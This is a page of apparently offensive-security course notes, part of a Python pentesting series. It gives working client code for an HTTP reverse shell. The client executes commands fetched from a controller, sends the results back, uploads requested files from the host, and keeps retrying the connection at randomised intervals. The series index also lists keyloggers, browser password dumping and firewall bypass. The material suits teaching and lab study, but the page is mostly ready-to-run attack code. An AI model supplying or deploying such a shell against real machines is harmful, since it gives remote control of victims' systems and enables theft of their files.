---
title: Tunning the connection attempts
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Tunning the connection attempts

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## Client side

We put our previous [http shell](coding-an-http-reverse-shell.md) in a function called connect.

```python
import requests
import os
import subprocess
import time

import random # Needed to generate random 


def connect(): # we put our previous http shell in a function called connect

    while True:

        req = requests.get('http://127.0.0.1:8080')
        command = req.text

        if 'terminate' in command:
            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script


        elif 'grab' in command:
            grab, path = command.split("*")
            if os.path.exists(path):
                url = "http://127.0.0.1:8080/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not able to find the file!'.encode())
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stderr.read())
    time.sleep(3)


# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
# infinite loop once again untill we got a sucessful connection. 


while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1, 10)#Sleep for a random time between 1-10 seconds
        time.sleep(int(sleep_for))
        #time.sleep( sleep_for * 60 )      #Sleep for a random time between 1-10 minutes
        pass

```